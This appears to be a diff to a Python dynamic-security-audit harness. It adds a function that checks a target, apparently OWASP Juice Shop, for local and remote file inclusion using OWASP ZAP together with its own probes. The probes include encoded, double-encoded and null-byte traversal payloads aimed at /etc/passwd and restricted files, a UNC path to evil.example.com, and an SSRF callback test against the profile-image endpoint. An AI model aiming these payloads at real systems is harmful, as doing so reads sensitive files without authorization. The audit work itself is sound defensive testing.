@@ -11278,6 +11278,274 @@ def evaluate_azi04_cmd_injection(
     }
 
 
+def evaluate_azi05_lfi_rfi(
+    target_url: str,
+    *,
+    auth_headers: dict[str, str] | None = None,
+    session_token: str = "",
+    crawled_exchanges: list[dict] | None = None,
+    http_probe_fn=None,
+    is_spa_fallback_fn=None,
+    param_targets: list[tuple[str, str]] | None = None,
+    rfi_targets: list[str] | None = None,
+    zap_lfi_report: dict | None = None,
+    zap_seed_urls: list[str] | None = None,
+    zap_json_out_path: Path | None = None,
+    zap_sarif_out_path: Path | None = None,
+    report_out_path: Path | None = None,
+    har_out_path: Path | None = None,
+    run_zap: bool = True,
+) -> dict:
+    """Evaluate AZI-05 (ASVS V5.3.9, V12.3.2-3 / CWE-22, CWE-98) via OWASP ZAP 6/7 + LFI/RFI matrix."""
+    base_url = target_url.strip().rstrip("/")
+    auth_hdrs = dict(auth_headers or {})
+    _probe_logged, _write_har, _ = _make_redacted_har_probe(base_url, http_probe_fn=http_probe_fn)
+
+    def _is_spa(txt: str) -> bool:
+        if is_spa_fallback_fn is not None:
+            return bool(is_spa_fallback_fn(txt))
+        return "<app-root>" in txt and "OWASP Juice Shop" in txt
+
+    path_param_names = {"file", "path", "page", "template", "doc", "img", "url", "include"}
+
+    # 1. Focused OWASP ZAP Active Path Traversal (6) & Remote File Inclusion (7) Scan
+    seeds_lfi = list(zap_seed_urls or [f"{base_url}/ftp/", f"{base_url}/support/logs/"])
+    for ex in crawled_exchanges or []:
+        ex_url = str(ex.get("url") or "")
+        if ex.get("method", "GET") == "GET" and "?" in ex_url and ex_url.startswith(base_url) and ex_url not in seeds_lfi:
+            qs_keys = {k.lower() for k in urllib.parse.parse_qs(urllib.parse.urlparse(ex_url).query)}
+            if qs_keys & path_param_names:
+                seeds_lfi.append(ex_url)
+                if len(seeds_lfi) >= 4:
+                    break
+
+    if zap_lfi_report is not None and zap_lfi_report.get("executed"):
+        active_zap = zap_lfi_report
+    elif run_zap:
+        active_zap = run_zap_automation(
+            base_url,
+            seed_urls=seeds_lfi,
+            active_scan_rules=[6, 7],
+            json_out_path=zap_json_out_path or (OUTPUT_DIR / "zap-lfi-report.json"),
+            sarif_out_path=zap_sarif_out_path or (OUTPUT_DIR / "zap-lfi-findings.sarif"),
+            timeout_sec=300,
+        )
+    else:
+        active_zap = {"executed": False, "alerts": [], "sarifPath": str(zap_sarif_out_path or (OUTPUT_DIR / "zap-lfi-findings.sarif"))}
+
+    azi05_findings: list[dict] = []
+    seen_lfi_keys: set[tuple[str, str]] = set()
+    zap_matched_plugins: set[str] = set()
+
+    def _add_lfi_finding(url: str, form: str, cwe: str, status: int, detail: str, *, confirmed_by: str) -> None:
+        k_l = (url.split("?", 1)[0], form)
+        if k_l in seen_lfi_keys:
+            return
+        seen_lfi_keys.add(k_l)
+        azi05_findings.append(
+            {
+                "url": url,
+                "form": form,
+                "cwe": cwe,
+                "status": status,
+                "confirmedBy": confirmed_by,
+                "detail": detail,
+            }
+        )
+
+    for al in active_zap.get("alerts", []) or []:
+        pid = str(al.get("pluginid") or "")
+        aname = str(al.get("alert") or "")
+        low_a = aname.lower()
+        if pid in {"6", "7", "40033"} or any(kw in low_a for kw in ("path traversal", "remote file inclusion", "local file")):
+            zap_matched_plugins.add(pid or "6")
+            cwe_id = "CWE-98" if pid == "7" or "remote file inclusion" in low_a else "CWE-22"
+            for inst in al.get("instances", []) or []:
+                uri = str(inst.get("uri") or base_url)
+                p_nm = str(inst.get("param") or "")
+                atk = str(inst.get("attack") or "")
+                _add_lfi_finding(
+                    uri.split("?", 1)[0],
+                    f"OWASP_ZAP_{pid or 'LFI'}",
+                    cwe_id,
+                    200,
+                    f"[OWASP ZAP {pid or 'LFI'}] {aname} detected at {uri.split('?', 1)[0]} (param='{p_nm}', attack='{atk[:60]}') ({cwe_id}).",
+                    confirmed_by=f"owasp_zap_{pid or 'lfi'}",
+                )
+
+    # 2. Encoded, double-encoded, null-byte, absolute, and UNC traversal probes (CWE-22)
+    azi05_probes = 0
+    lfi_marker_re = re.compile(r'root:[x*]:0:0:|"name"\s*:\s*"juice-shop"|suspicious error messages|\[boot loader\]', re.IGNORECASE)
+
+    if param_targets is not None:
+        traversal_vectors = [
+            (lbl, tpl.format(p=payload), lambda b: bool(lfi_marker_re.search(b)))
+            for path_lbl, tpl in param_targets
+            for lbl, payload in [
+                (f"{path_lbl}_encoded_dotdot", "..%2f..%2f..%2fetc%2fpasswd"),
+                (f"{path_lbl}_double_encoded", "..%252f..%252f..%252fetc%252fpasswd"),
+                (f"{path_lbl}_null_byte", "..%2fetc%2fpasswd%2500.md"),
+                (f"{path_lbl}_absolute_path", "%2fetc%2fpasswd"),
+                (f"{path_lbl}_unc_path", "%5c%5cevil.example.com%5cshare%5cfile.md"),
+            ]
+        ]
+    else:
+        traversal_vectors = [
+            ("null_byte_package_json_bak", "/ftp/package.json.bak%2500.md", lambda b: '"name": "juice-shop"' in b),
+            ("null_byte_restricted_yaml", "/ftp/suspicious_errors.yml%2500.md", lambda b: "suspicious error messages" in b.lower()),
+            ("null_byte_etc_passwd", "/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd%2500.md", lambda b: "root:x:0:0:" in b),
+            ("encoded_dotdot_slash", "/ftp/..%2fpackage.json", lambda b: '"name": "juice-shop"' in b or "root:x:0:0:" in b),
+            ("double_encoded_traversal", "/ftp/..%252fpackage.json%2500.md", lambda b: '"name": "juice-shop"' in b or "root:x:0:0:" in b),
+            ("logs_encoded_traversal", "/support/logs/..%2fpackage.json", lambda b: '"name": "juice-shop"' in b),
+            ("absolute_path_form", "/ftp/%2fetc%2fpasswd", lambda b: "root:x:0:0:" in b),
+            ("unc_network_path_form", "/ftp/%5c%5cevil.example.com%5cshare%5cfile.md", lambda b: "root:x:0:0:" in b),
+        ]
+        seen_qpaths: set[str] = set()
+        for ex in crawled_exchanges or []:
+            ex_url = str(ex.get("url") or "")
+            if ex.get("method", "GET") == "GET" and "?" in ex_url and ex_url.startswith(base_url):
+                pr = urllib.parse.urlparse(ex_url)
+                qs_keys = [k for k in urllib.parse.parse_qs(pr.query) if k.lower() in path_param_names]
+                if qs_keys and pr.path not in seen_qpaths:
+                    seen_qpaths.add(pr.path)
+                    pk = qs_keys[0]
+                    for form_lbl, pl in [("encoded_dotdot", "..%2f..%2fetc%2fpasswd"), ("double_encoded", "..%252f..%252fetc%252fpasswd"), ("null_byte", "..%2fetc%2fpasswd%2500.md"), ("absolute_path", "%2fetc%2fpasswd")]:
+                        traversal_vectors.append((f"crawl_{form_lbl}", f"{pr.path}?{pk}={pl}", lambda b: bool(lfi_marker_re.search(b))))
+                    if len(seen_qpaths) >= 2:
+                        break
+
+    for vec_name, vec_path, matcher_fn in traversal_vectors:
+        st5, _, b5 = _probe_logged(vec_path, headers=auth_hdrs)
+        azi05_probes += 1
+        if 200 <= st5 < 300 and not _is_spa(b5) and matcher_fn(b5):
+            preview = b5.strip().splitlines()[0][:90] if b5.strip() else ""
+            _add_lfi_finding(
+                f"{base_url}{vec_path}",
+                vec_name,
+                "CWE-22",
+                st5,
+                f"GET {base_url}{vec_path} ({vec_name}) bypassed path/extension restrictions and returned restricted file contents (HTTP {st5}, preview='{preview}').",
+                confirmed_by="traversal_probe",
+            )
+
+    # 3. Active Remote File Inclusion / remote resource fetch probe (CWE-98)
+    rfi_cb_hits: list[str] = []
+    rfi_lock = threading.Lock()
+
+    class _RfiCallbackHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            with rfi_lock:
+                rfi_cb_hits.append(self.path)
+            self.send_response(200)
+            self.send_header("Content-Type", "image/svg+xml")
+            self.end_headers()
+            self.wfile.write(b"<svg xmlns='http://www.w3.org/2000/svg'><text>CASA3_RFI</text></svg>")
+
+        def log_message(self, *args):
+            pass
+
+    rfi_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _RfiCallbackHandler)
+    rfi_port = rfi_srv.server_address[1]
+    threading.Thread(target=rfi_srv.serve_forever, daemon=True).start()
+    unique_rfi_hits: list[str] = []
+    try:
+        rfi_target_url = f"http://127.0.0.1:{rfi_port}/casa3_rfi_probe.svg"
+        if session_token:
+            rfi_st, _, rfi_body = _probe_logged(
+                "/profile/image/url",
+                method="POST",
+                headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": f"token={session_token}"},
+                body=f"imageUrl={urllib.parse.quote(rfi_target_url, safe='')}".encode("utf-8"),
+            )
+            azi05_probes += 1
+            time.sleep(0.25)
+            with rfi_lock:
+                unique_rfi_hits = sorted(set(rfi_cb_hits))
+            if unique_rfi_hits or "CASA3_RFI" in rfi_body:
+                _add_lfi_finding(
+                    f"{base_url}/profile/image/url",
+                    "remote_file_inclusion_fetch",
+                    "CWE-98",
+                    rfi_st,
+                    f"POST {base_url}/profile/image/url (imageUrl={rfi_target_url}) caused the server to fetch arbitrary remote resource(s) {unique_rfi_hits} (HTTP {rfi_st}, RFI/SSRF — CWE-98).",
+                    confirmed_by="rfi_oob_fetch",
+                )
+
+        for rfi_tpl in rfi_targets or []:
+            rfi_url_path = rfi_tpl.format(p=urllib.parse.quote(rfi_target_url, safe=""))
+            rq_st, _, rq_body = _probe_logged(rfi_url_path, headers=auth_hdrs)
+            azi05_probes += 1
+            time.sleep(0.15)
+            with rfi_lock:
+                unique_rfi_hits = sorted(set(rfi_cb_hits))
+            if (unique_rfi_hits or "CASA3_RFI" in rq_body) and 200 <= rq_st < 300:
+                _add_lfi_finding(
+                    f"{base_url}{rfi_url_path.split('?', 1)[0]}",
+                    "remote_file_inclusion_marker",
+                    "CWE-98",
+                    rq_st,
+                    f"GET {base_url}{rfi_url_path.split('?', 1)[0]} fetched remote resource {unique_rfi_hits} and/or returned inclusion marker CASA3_RFI (HTTP {rq_st}, CWE-98).",
+                    confirmed_by="rfi_inclusion_marker" if "CASA3_RFI" in rq_body else "rfi_oob_fetch",
+                )
+    finally:
+        rfi_srv.shutdown()
+        rfi_srv.server_close()
+
+    rep_file = report_out_path or (OUTPUT_DIR / "azi05-lfi-rfi-audit.json")
+    rep_file.parent.mkdir(parents=True, exist_ok=True)
+    rep_file.write_text(
+        json.dumps(
+            {
+                "standard": "OWASP ASVS V5.3.9, V12.3.2-3 / CWE-22, CWE-98 (OWASP ZAP 6/7 + LFI/RFI Matrix)",
+                "target": base_url,
+                "verdict": "FAIL" if azi05_findings else "PASS",
+                "probesRun": azi05_probes,
+                "rfiCallbacks": unique_rfi_hits,
+                "zapPluginsMatched": sorted(zap_matched_plugins),
+                "findings": azi05_findings,
+            },
+            indent=2,
+            ensure_ascii=False,
+        ),
+        encoding="utf-8",
+    )
+
+    har_file = har_out_path or (OUTPUT_DIR / "azi05-replayed.har")
+    _write_har(har_file, "casa-audit-azi05-lfi-rfi-harness")
+
+    sarif_items: list[dict] = []
+    for afz5 in azi05_findings:
+        sarif_items.append(
+            {
+                "ruleId": "CASA3-AZI-05",
+                "level": "error",
+                "message": {"text": afz5["detail"]},
+                "locations": [{"physicalLocation": {"artifactLocation": {"uri": afz5["url"]}}}],
+                "properties": {
+                    "controlId": "AZI-05",
+                    "payloadForm": afz5["form"],
+                    "cwe": afz5["cwe"],
+                    "httpStatus": afz5["status"],
+                    "confirmedBy": afz5["confirmedBy"],
+                },
+            }
+        )
+
+    azi05_fail = len(azi05_findings) > 0
+    return {
+        "verdict": "FAIL" if azi05_fail else "PASS",
+        "azi05_fail": azi05_fail,
+        "probesRun": azi05_probes,
+        "rfiCallbacks": unique_rfi_hits,
+        "zap": active_zap,
+        "zapPluginsMatched": sorted(zap_matched_plugins),
+        "findings": azi05_findings,
+        "reportPath": str(rep_file),
+        "harPath": str(har_file),
+        "sarifResults": sarif_items,
+    }
+
+
 def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, dict]:
     results: dict[str, dict] = {}
     OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
@@ -12379,118 +12647,29 @@ def run_dynamic_and_protocol_checks(target_url: str, repo: Path) -> dict[str, di
         ),
     }
 
-    # AZI-05: Traversal (encoded, double-encoded, null-byte, absolute, UNC) + Remote File Inclusion callback probe (SARIF 2.1.0 + redacted HAR 1.2)
-    azi05_findings: list[dict] = []
-    azi05_probes = 0
-
-    traversal_vectors = [
-        ("null_byte_package_json_bak", "/ftp/package.json.bak%2500.md", lambda b: '"name": "juice-shop"' in b),
-        ("null_byte_restricted_yaml", "/ftp/suspicious_errors.yml%2500.md", lambda b: "suspicious error messages" in b.lower()),
-        ("null_byte_etc_passwd", "/ftp/..%2f..%2f..%2f..%2fetc%2fpasswd%2500.md", lambda b: "root:x:0:0:" in b),
-        ("encoded_dotdot_slash", "/ftp/..%2fpackage.json", lambda b: '"name": "juice-shop"' in b or "root:x:0:0:" in b),
-        ("double_encoded_traversal", "/ftp/..%252fpackage.json%2500.md", lambda b: '"name": "juice-shop"' in b or "root:x:0:0:" in b),
-        ("logs_encoded_traversal", "/support/logs/..%2fpackage.json", lambda b: '"name": "juice-shop"' in b),
-        ("absolute_path_form", "/ftp/%2fetc%2fpasswd", lambda b: "root:x:0:0:" in b),
-        ("unc_network_path_form", "/ftp/%5c%5cevil.example.com%5cshare%5cfile.md", lambda b: "root:x:0:0:" in b),
-    ]
-    for vec_name, vec_path, matcher_fn in traversal_vectors:
-        st5, _, b5 = http_probe(vec_path, headers=auth_req_headers)
-        azi05_probes += 1
-        if 200 <= st5 < 300 and not is_spa_fallback(b5) and matcher_fn(b5):
-            azi05_findings.append(
-                {
-                    "url": f"{base_url}{vec_path}",
-                    "form": vec_name,
-                    "cwe": "CWE-22",
-                    "status": st5,
-                    "detail": (
-                        f"GET {base_url}{vec_path} ({vec_name}) bypassed path/extension restrictions and returned restricted file contents "
-                        f"(HTTP {st5}, preview='{b5.strip().splitlines()[0][:90]}')."
-                    ),
-                }
-            )
-
-    # Active Remote File Inclusion / remote resource fetch probe via POST /profile/image/url
-    rfi_cb_hits: list[str] = []
-    rfi_lock = threading.Lock()
-
-    class RfiCallbackHandler(http.server.BaseHTTPRequestHandler):
-        def do_GET(self):
-            with rfi_lock:
-                rfi_cb_hits.append(self.path)
-            self.send_response(200)
-            self.send_header("Content-Type", "image/svg+xml")
-            self.end_headers()
-            self.wfile.write(b"<svg xmlns='http://www.w3.org/2000/svg'><text>CASA3_RFI</text></svg>")
-
-        def log_message(self, *args):
-            pass
-
-    rfi_srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), RfiCallbackHandler)
-    rfi_port = rfi_srv.server_address[1]
-    threading.Thread(target=rfi_srv.serve_forever, daemon=True).start()
-    try:
-        if session_a_tok:
-            rfi_target_url = f"http://127.0.0.1:{rfi_port}/casa3_rfi_probe.svg"
-            rfi_st, _, _ = http_probe(
-                "/profile/image/url",
-                method="POST",
-                headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": f"token={session_a_tok}"},
-                body=f"imageUrl={urllib.parse.quote(rfi_target_url, safe='')}".encode("utf-8"),
-            )
-            azi05_probes += 1
-            time.sleep(0.25)
-            with rfi_lock:
-                if rfi_cb_hits:
-                    azi05_findings.append(
-                        {
-                            "url": f"{base_url}/profile/image/url",
-                            "form": "remote_file_inclusion_fetch",
-                            "cwe": "CWE-98",
-                            "status": rfi_st,
-                            "detail": (
-                                f"POST {base_url}/profile/image/url (imageUrl={rfi_target_url}) caused the server to fetch "
-                                f"arbitrary remote resource(s) {sorted(set(rfi_cb_hits))} (HTTP {rfi_st}, RFI/SSRF — CWE-98)."
-                            ),
-                        }
-                    )
-    finally:
-        rfi_srv.shutdown()
-        rfi_srv.server_close()
-
-    for afz5 in azi05_findings:
-        dast_sarif_results.append(
-            {
-                "ruleId": "CASA3-AZI-05",
-                "level": "error",
-                "message": {"text": afz5["detail"]},
-                "locations": [
-                    {
-                        "physicalLocation": {
-                            "artifactLocation": {"uri": afz5["url"]},
-                        }
-                    }
-                ],
-                "properties": {
-                    "controlId": "AZI-05",
-                    "payloadForm": afz5["form"],
-                    "cwe": afz5["cwe"],
-                    "httpStatus": afz5["status"],
-                },
-            }
-        )
-
-    lfi_vuln = len(azi05_findings) > 0
+    # AZI-05: OWASP ZAP Active LFI/RFI (Rules 6/7) + Encoded/Double-Encoded/Null-Byte/Absolute/UNC Traversal & RFI Probe (SARIF 2.1.0 + redacted HAR 1.2)
+    azi05_eval = evaluate_azi05_lfi_rfi(
+        base_url,
+        auth_headers=auth_req_headers,
+        session_token=session_a_tok or "",
+        crawled_exchanges=crawled_exchanges,
+        http_probe_fn=http_probe,
+        is_spa_fallback_fn=is_spa_fallback,
+    )
+    azi05_findings = azi05_eval["findings"]
+    azi05_probes = azi05_eval["probesRun"]
+    dast_sarif_results.extend(azi05_eval["sarifResults"])
+    lfi_vuln = azi05_eval["azi05_fail"]
     azi05_lines = [f"[{az5['cwe']} / {az5['form']}] {az5['detail']}" for az5 in azi05_findings]
     results["AZI-05"] = {
-        "verdict": "FAIL" if lfi_vuln else "PASS",
-        "tool": f"Authenticated LFI/Traversal & RFI Matrix Probe ({azi05_probes} payloads: encoded, double-encoded, null-byte, absolute, UNC, RFI, SARIF 2.1.0 + redacted HAR 1.2)",
+        "verdict": azi05_eval["verdict"],
+        "tool": f"OWASP ZAP {zap_ver_label} (Rules 6/7) & LFI/Traversal + RFI Matrix Probe ({azi05_probes} payloads, SARIF 2.1.0 + redacted HAR 1.2)",
         "log": (
-            f"[FAIL] {len(azi05_findings)} LFI/Path Traversal/RFI violation(s) confirmed across {azi05_probes} probes:\n  - "
+            f"[FAIL] {len(azi05_findings)} LFI/Path Traversal/RFI violation(s) confirmed (ZAP plugins={azi05_eval['zapPluginsMatched']}, probes={azi05_probes}):\n  - "
             + "\n  - ".join(azi05_lines)
-            + f"\n\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
+            + f"\n\nEvidence Artifacts:\n  - AZI-05 Audit JSON: {azi05_eval['reportPath']}\n  - AZI-05 Redacted HAR 1.2: {azi05_eval['harPath']}\n  - ZAP LFI/RFI SARIF 2.1.0: {azi05_eval['zap'].get('sarifPath')}\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
             if lfi_vuln
-            else f"[PASS] Executed {azi05_probes} traversal and inclusion probes (encoded, double-encoded, null-byte, absolute, UNC, RFI); 0 out-of-root/restricted contents or remote inclusions observed.\nEvidence Artifacts:\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
+            else f"[PASS] Executed OWASP ZAP {zap_ver_label} (6/7) and {azi05_probes} traversal/inclusion probes (encoded, double-encoded, null-byte, absolute, UNC, RFI); 0 out-of-root/restricted contents or remote inclusions observed.\nEvidence Artifacts:\n  - AZI-05 Audit JSON: {azi05_eval['reportPath']}\n  - AZI-05 Redacted HAR 1.2: {azi05_eval['harPath']}\n  - ZAP LFI/RFI SARIF 2.1.0: {azi05_eval['zap'].get('sarifPath')}\n  - DAST SARIF 2.1.0: {dast_sarif_path}\n  - Redacted HTTP HAR 1.2: {har_path}"
         ),
     }
 
